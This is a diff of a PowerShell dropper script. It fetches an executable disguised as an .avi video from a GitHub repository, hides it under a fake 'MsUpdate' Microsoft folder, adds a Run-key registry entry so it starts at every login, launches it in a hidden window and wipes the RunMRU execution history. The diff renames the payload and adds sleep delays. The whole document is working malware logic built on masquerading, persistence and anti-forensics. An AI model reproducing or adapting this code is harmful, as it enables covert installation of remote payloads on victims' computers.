@@ -21,30 +21,32 @@ $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.F
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
 
 # Copy Runer
-$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
-$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
+$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
+$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mssucn.avi"
 if (-not (Test-Path $rutaLocalRuner)) {
     Invoke-WebRequest -Uri $urlRemotoRuner -OutFile $rutaLocalRuner
 }
-if ((Get-Item $rutaLocalRuner).Name -ne "SMSUCN.exe") {
-    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'SMSUCN.avi', 'SMSUCN.exe'
+if ((Get-Item $rutaLocalRuner).Name -ne "Mssucn.exe") {
+    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'Mssucn.avi', 'Mssucn.exe'
     Rename-Item -Path $rutaLocalRuner -NewName $rutaNuevoNombreRuner
 }
 $atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalRuner -Name Attributes -Value $atributosOcultosRuner
-
+sleep 10
 
 # Registry path for the startup entries
 $rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $nombreEntrada = "MsUpdate"
 if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
-    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
+    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
     $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
 }
+sleep 10
 
 ## Execution of the client
-Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -WindowStyle Hidden
+Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe" -WindowStyle Hidden
 
+sleep 30
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
